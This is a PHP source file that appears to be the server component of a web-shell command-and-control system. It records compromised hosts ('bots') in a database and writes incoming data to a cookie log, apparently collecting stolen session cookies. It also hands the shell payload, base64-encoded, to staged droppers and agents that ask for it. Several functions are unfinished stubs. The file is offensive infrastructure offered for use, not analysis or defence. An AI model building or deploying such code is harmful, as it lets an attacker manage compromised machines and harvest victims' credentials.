<?php
# Obviously this will change depending on what your database information is. but this will append new 'bots'
# to the db so you can reference them with the client script.
require "db/postgres_pdo.php.php";
require "includes/db/slopSqlite.php";

function db_calls(array $data){
    switch (SQL_SELECTION){
        case strpos(SQL_SELECTION, "pgsql") !== false:
            $d = new postgres_pdo("psgql:host=localhost;dbname=postgres", "postgres");
            break;
        default:
            $d = new slopSqlite(getcwd()."/includes/db/sqlite3_repo/slop.sqlite", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, "");
            break;
    }
    switch ($data['action']){
        
    }

}

function fresh_deploy()
{
    $fp = fopen("/tmp/diag_php.pid", "a");
    switch (SQL_SELECTION){
        case strpos(SQL_SELECTION, "pgsql") !== false:
            $db_call = new postgres_pdo("psgql:host=localhost;dbname=postgres", "postgres");
            try {
                # place this file in a writable directory, im going with /tmp/ for now.
                # this will only be called if the deployment is fresh. and if this file is still located in /tmp/
                if (empty(fread($fp, 1))) {
                    if ($db_call->firstRun() != false) {
                        fwrite($fp, "running");
                        fclose($fp);
                        return true;
                    } else {
                        return true;
                    }

                } else {
                    return False;
                }
            } catch (Exception $ee) {
                return false;
            }
        default:
            $db_call = new slopSqlite(getcwd()."/includes/db/sqlite3_repo/slop.sqlite", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, "");
            if (!is_file("/tmp/diag_php.pid")) {
                if ($db_call->checkDataBase("local")) {
                    fwrite($fp, "running");
                    fclose($fp);
                    return true;
                }
            }else{
                return true;
            }
    }
}

function addNewHost($rhost, $uri, $action, $uid, $os, $ci)
{
    if (!empty($rhost) && !empty($uri) && !empty($action) && !empty($os) && !empty($uid)) {
        $createNewHost = new postgres_checker();
        $createNewHost->insertRecord($rhost, $uri, $os, $ci, $uid, $action);
        http_response_code("200");
    } else {
        http_response_code('444');
    }
}

function grabSloppyContents(array $data): array{
    /*
     * Function to grab the slop shell contents and return it to a staged dropper/agent.
     * REQUIRES:
     * $data:array -> [
     * "remote_host" => "",
     * "uuid" => "", //Generated at your server, assigned to the shell/dropper/agent.
     * "needs_cert" => "" //Boolean value, if the shell is asking for an encrypted version to decrypt server side.
     * "" => "" // Dont know yet.
     * ]
     *  */
    if (is_array($data)){
        if (filter_var($data['remote_host'], FILTER_VALIDATE_IP) !== false){
            $remote_host = $data['remote_host'];
        }elseif (filter_var($data['remote_host'], FILTER_VALIDATE_DOMAIN) !== false){
            $remote_host = $data['remote_host'];
        }else{
            http_response_code(418);
            header("Reason: Fuck off.");
        }
        $uuid = filter_var($data['uuid'], FILTER_SANITIZE_STRING);
        $needsCert = $data['needs_cert'];
        if (is_string($needsCert)){
            $needsCert = (bool)filter_var($needsCert, FILTER_SANITIZE_STRING);
        }

    }
    return [];

}

function grabSloppyCert(array $data) : array{
    /*
     * Function to grab the certificate contents used to encrypt the final stage and return it to a staged dropper/agent.
     * REQUIRES:
     * $data:array -> [
     * "remote_host" => "",
     * "uuid" => "", //Generated at your server, assigned to the shell/dropper/agent.
     * "" => "" // Dont know yet.
     * ]
     *  */
    if (is_array($data)){

    }
    return [];
}


if (!file_exists(sys_get_temp_dir() . "/diag_php.pid")) {
    fresh_deploy();
}


if (!empty($_SERVER["REQUEST_METHOD"])) {
    $outLog = './lots/cookie.log';
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    } else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        if (strtolower($_POST["ac"]) === "add" && isset($_POST["iru"]) && isset($_POST["u"]) && isset($_POST['o'])) {
            addNewHost($_SERVER["REMOTE_ADDR"], $_POST["iru"], "add", $_POST["u"], $_POST['o'], 0);
        } elseif (strtolower($_POST["ac"]) === "ci") {
            addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-', 0);
        }elseif ($_POST['r'] === 'pull'){
            echo base64_encode(file('slop.php'));
        }
    }
}else{
    http_response_code(444);
}
